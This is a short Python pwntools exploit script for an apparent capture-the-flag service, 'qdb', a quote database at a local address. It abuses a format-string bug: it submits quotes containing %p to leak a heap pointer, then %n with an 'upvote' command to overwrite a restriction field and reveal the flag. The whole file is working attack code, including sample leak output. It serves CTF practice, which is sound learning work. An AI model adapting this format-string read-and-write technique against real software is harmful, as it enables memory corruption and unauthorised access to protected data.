
#!/usr/bin/env python
from pwn import *

"""
> submit
-- ENTER QUOTE INFORMATION --
Author: john
Quote: %d|%p|%p|%p|%p|%p|%p|%p|%p
> show 9
"0|(nil)|(nil)|0x1999999999999999|(nil)|0x9ffffdd80|0x55555555a4a0|0x55555555d280|0x55555555a4a0" -- john (+-9056)
"""
# 0x55555555c3b0
# 0x55555555c3b0


# p = gdb.debug('./qdb')
p = remote('127.0.0.1', 3000)
out = p.recvuntil('> ')

def send(cmd):
    p.sendline(cmd)
    return p.recvuntil('> ').replace('> ', '')

# 1. Delete All entries to make the FLAG entry the first. This simpplifies exploit code.
info('Removing useless quotes.')
for i in range(7): send('del {}'.format(i+1))


# 2. Now Leak the pointer of the head of the list.
info('Leaking FLAG address.')
send('submit\nLeak\n%d|%p|%p|%p|%p|%p|%p|%p')
out = send('show 9')
head = out.split('|')[6]

addr = int(head, 16) + 0x20 # 0x20 is the node->restricted offset.
success('FLAG entry @ ' + head)

info('Lifting restriction on flag...')
send('submit\nOverride\n%n')
send('upvote 10 {}'.format(addr))

# 4. Print flag.
send('list')
out = send('show 10')
out = send('show 8')
print(out.split('  --')[0])

